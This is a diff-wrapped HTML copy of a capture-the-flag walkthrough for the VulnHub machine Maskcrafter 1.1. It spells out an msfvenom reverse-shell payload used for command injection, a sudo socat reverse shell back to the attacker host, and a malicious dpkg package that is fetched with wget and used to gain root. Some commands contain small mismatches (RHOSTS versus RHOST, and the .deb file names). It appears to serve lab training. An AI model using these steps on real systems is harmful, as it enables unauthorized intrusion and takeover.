@@ -1,0 +1,151 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Maskcrafter: 1.1: Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/maskcrafter-1-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-10-14T14:54:47+00:00">October 14, 2020</time><time class="updated" datetime="2025-07-10T15:47:22+00:00">July 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack this vulnerable machine called Maskcrafter: 1.1. It is created by <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/evdaez">evdaez</a>.</strong></span> It is a simple Boot to root kind of challenge. We need to get root privilege on the machine and read the root flag to complete the challenge. Overall, it was an intermediate machine to crack.</span></p>
+<p><span style="color: #000000;">Download Lab from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/maskcrafter-11,445/">here</a></strong></span>.</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">FTP Anonymous Login</span></li>
+<li><span style="color: #000000;">Enumerating FTP for hints</span></li>
+<li><span style="color: #000000;">Enumerating /debug directory</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Crafting Payload using msfvenom</span></li>
+<li><span style="color: #000000;">Exploiting the Command Injection</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Post Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating MySQL database</span></li>
+<li><span style="color: #000000;">Extracting cred.zip</span></li>
+<li><span style="color: #000000;">Logging into SSH</span></li>
+<li><span style="color: #000000;">Enumerating Sudo Permissions</span></li>
+<li><span style="color: #000000;">Exploiting Sudo Permissions on custom script</span></li>
+<li><span style="color: #000000;">Enumerating Sudo Permissions</span></li>
+<li><span style="color: #000000;">Exploiting Sudo Permissions on socat</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating Sudo Permissions</span></li>
+<li><span style="color: #000000;">Crafting deb Installation Package using fpm</span></li>
+<li><span style="color: #000000;">Installing the malicious package using dpkg</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Reading Root Flag</strong></span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">To attack any machine, we need to find the IP Address of the machine. This can be done using the netdiscover command. To find the IP Address, we need to co-relate the MAC Address of the machine that can be obtained from the Virtual Machine Configuration Setting.  The IP Address of the machine was found to be <strong>192.168.1.110</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-liwhXiE3JNo/X4cNxsWGbFI/AAAAAAAApko/98iTPRHvZB8HLBab_Q3BpBr1OAaGo7dlQCLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">Following the netdiscover scan, we need a Nmap scan to get the information about the service running on the virtual machine. An aggressive Nmap scan reveals that 5 services: FTP (21), SSH (22), HTTP (80), RPC (111), NFS (2049).</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.110</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vkDabsbEuXU/X4cN28MVA0I/AAAAAAAApks/P6HK9yPh88kx4F6S4wObbKBpvBwD1bfkgCLcBGAsYHQ/s16000/2.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">Let’s start the enumeration stage with the FTP Service. It was clear from the Nmap Scan that FTP allows Anonymous Login. We got inside using it. We listed contents and found the pub directory. Inside the pub directories, we find 3 files. A NOTES.txt file, A zip file by the name of cred.zip, and a php file by the name of rce. Pretty convenient. Let’s download all the files to our local system to take a closer look.</span></p>
+<pre class="lang:default decode:true">ftp 192.168.1.110
+Anonymous
+ls
+cd pub
+ls
+get NOTES.txt
+get cred.zip
+get rce.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lCQWJGzzo7I/X4cN86WFP0I/AAAAAAAApkw/oUGYTrh5O8UKcE87VtNvEa4iyxM6KJf2QCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">First, let’s check the NOTES.txt file. It said that there is a web directory by the name of /debug. It might contain a strong password. That makes bruteforce out of question. Also, the username is the admin that is confirmed in the note.</span></p>
+<pre class="lang:default decode:true">cat NOTES.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JDeZ8pC8TT4/X4cOC3peNyI/AAAAAAAApk0/l01xSICaujglYIj7cALzz_iuHKtvtzfuQCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">We went to take a look at the debug directory. We were greeted with a login panel. Now we knew the username was admin. We tried the admin as a password as well. We were in. That didn’t seem so hard. It contained the 3 commands that can be selected and executed.</span></p>
+<pre class="lang:default decode:true">http://192.168.1.110/debug/index.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gBSzfFDsvHA/X4cOH8KhE6I/AAAAAAAApk8/Qik8Csqx69csJ0zTkgM7jN7BZH7OBe-9ACLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">We used BurpSuite to capture the request to analyze how the commands are sent to the command to get executed. We saw that it is a simple parameter with a clear text command.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PctlBxWW9pw/X4cONdzSelI/AAAAAAAAplE/l4xadSl4L0cZUSzGLDYGORbO59om0wURgCLcBGAsYHQ/s16000/6.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">This meant that we can craft a payload using msfvenom in the Raw format and use it to exploit it to get a session.</span></p>
+<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_python lhost=192.168.1.112 lport=1234 R</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sWKogD8bdLY/X4cOT3W8nMI/AAAAAAAAplI/AwuRDB2-YGMPDIR7xMvdaQ7DWeCEFQqAgCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">We copied the raw payload code and replaced the ifconfig command in the captured request in the Burp Suite as shown in the image below:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6Rc7VGKf-TA/X4cObkDt8VI/AAAAAAAAplQ/C-0mIidnIAM7MTqsAYmcq2j8d9OQmCZ5ACLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">Before forwarding the request to the application, we start a netcat listener on the specified port from msfvenom i.e., 1234. After that, we forward the request and we see that we have a session on the target machine. We use the python one-liner to convert the shell into a TTY shell. The shell we have is of www-data user.</span></p>
+<pre class="lang:default decode:true">nc -lvp 1234
+id
+python -c 'import pty; pty.spawn("/bin/bash")'
+id</pre>
+<h3><span style="color: #800000;"><strong>Post-Exploitation</strong></span></h3>
+<p><span style="color: #000000;">We start the enumeration with the /var/www/ directory. We have the debug directory that was mentioned earlier. Then, we see that it contains a php file by the name of db.php. We open it to find the set of credentials for the Database.</span></p>
+<pre class="lang:default decode:true">ls
+cat db.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7O1EHpX01cE/X4cOn7pGNkI/AAAAAAAAplc/1ZYnxrZtkIEqj6batOD8A0SJBQqcGSw_QCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">We then connect to the database using this set of credentials. After connecting, we list the databases. Among those mydatabase seemed interesting. We enumerated it further to find 2 tables by the name of creds and log in. Firstly we list all the contents of the creds table to find the zip password cred12345!!</span></p>
+<pre class="lang:default decode:true">mysql -u web -p
+P@ssw0rdweb
+show databases;
+use mydatabase;
+show tables;
+select * from creds;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NCF29ykOqpI/X4cOtpGcKSI/AAAAAAAAplk/jPyZ8nCe5Q428aEWjkZ5aC7r0xmqp1iiACLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">We went back to our local machine and used the credential that we just found to unzip the cred.zip file we got earlier. It contained a cred.txt. It read another set of credentials as shown in the image below.</span></p>
+<pre class="lang:default decode:true">unzip cred.zip
+cat cred.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fK7d92Zq0iQ/X4cOy12LBYI/AAAAAAAAplo/SU40yvVDO7gUa-wYXpYAImu3ZFnw8Z2vwCLcBGAsYHQ/s16000/12.png"/></span></p>
+<h5><span style="color: #000000;">We use this set of credentials to log in as SSH.</span></h5>
+<pre class="lang:default decode:true">Username: userx
+Password: thisismypasswordforuserx2020</pre>
+<p><span style="color: #000000;">After logging in on the target machine via SSH, we used the Sudo -l command to list all the binaries that have the permission to run with elevated privileges. We found a script by the name whatsmyid.sh. It can be executed by the user evdaeez. We open the file in the nano editor.</span></p>
+<pre class="lang:default decode:true">ssh userx@192.168.1.110
+sudo -l</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wfPTbpv0ceU/X4cO3gZQtjI/AAAAAAAApls/bdk-wGRKJuM82qcAtpNkIOSHse4vI61RwCLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">We edit it to spawn a bash shell. It is as simple as writing /bin/bash in the script.</span></p>
+<pre class="lang:default decode:true">#!bin/bash
+/bin/bash</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--OHs-KEEaLs/X4cO83gup4I/AAAAAAAAplw/Bc9WL92HdC8w64YQmXFOiOb30iekGIYvwCLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">We tried to execute the script using the sudo command with u parameter. We see that we have the shell as evdaez. Then again run the sudo -l command to check for any more binaries that could lead us to root. We see that socat has permission as user resercherx. Let’s get to resercherx user by exploiting this permission on socat. To do this we have a one-liner that executes socat. It requires a remote host and port. We first define these variables in the session. We define the RHOST variable with the local IP Address of our Kali Linux or attacker machine. Next, we define the RPORT variable with a random port number such as 12345. Then we will execute the socat as the user resercherx and variables that we just declared.</span></p>
+<pre class="lang:default decode:true">sudo -u evdaez /scripts/whatsmyid.sh
+sudo -l
+RHOSTS=192.168.1.112
+RPORT=12345
+sudo -u resercherx socat tcp-connection:$RHOST:$RPORT exec:/bin/sh.pty,stderr,setsid,sigint,sane</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7Us3u0RAfCc/X4cPB332USI/AAAAAAAApl4/G5_OR0H2VksuIq-yvTeK751glZ8qC_s4QCLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">Before we execute a one-liner, we start a socat listener to capture the session that the target machine might generate. As soon as we execute the one-liner, we get a session on our local machine. Then we convert this shell into a TTY shell using the python script. Again, we ran the sudo -l command to check for binaries and their permissions. This time we have the sudo permissions on dpkg. We need to exploit this vulnerability to get root access to the machine.</span></p>
+<pre class="lang:default decode:true">socat file:'tty',raw,echo=0 tcp-listen:12345
+python -c 'import pty;pty.spawn("/bin/bash")'
+sudo -l</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2waBLttTFgc/X4cPHdjsVxI/AAAAAAAApmE/sNMuASTz6jkMaZXkTMWo2GYg7UH_EchwQCLcBGAsYHQ/s16000/16.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">The dpkg is used to install and manage packages. So, to get a root level shell from dpkg we need to provide it with a package to install. It will be of the malicious kind which can give us a shell. We get to our local machine to do this task. We searched dpkg on GTFOBINS and found a neat way to elevate privileges by dpkg. </span></p>
+<p><span style="color: #000000;">Now we need to craft a package using fpm and then that when installed with the help of dpkg it will grant us a root shell. First, we define a variable TF with the mktemp command which will create a temporary directory upon execution. Then we entered the shell invocation command into a shell file in the TF. Finally using the fpm, we crafted the contents of TF into a package. The resultant package was named x_1.0_all.deb. We ran the python script to create an HTTP server and transfer this deb file to the target machine.</span></p>
+<pre class="lang:default decode:true">TF=$(mktemp -d)
+echo 'exec /bin/sh' &gt; $TF/x.sh
+fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
+ls
+python -m SimpleHTTPServer</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0cEFzm4W6YY/X4cPMuYYp5I/AAAAAAAApmM/jBcPPqBtkdshKYptZMGwjOrJEbAdGOMLQCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">Since we don’t have write permissions anywhere in the application, we went into the temp directory and downloaded the deb file using the wget command. Now, all there left is use dpkg with sudo to install the malicious deb file and we have the root shell. We confirm this using the id command. Then we can see that we have the root flag to conclude the machine.</span></p>
+<pre class="lang:default decode:true">cd /tmp
+wget http://192.168.1.112:8000/s_1.0_all.deb
+sudo dpkg -i x_1.0_all.deb
+id
+cd /root
+ls
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-o_GLAm3dnfg/X4cPSW093DI/AAAAAAAApmQ/p51cBZrdn14B8_i-s7ZaNIRFra50ucz-wCLcBGAsYHQ/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more VulnHub Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
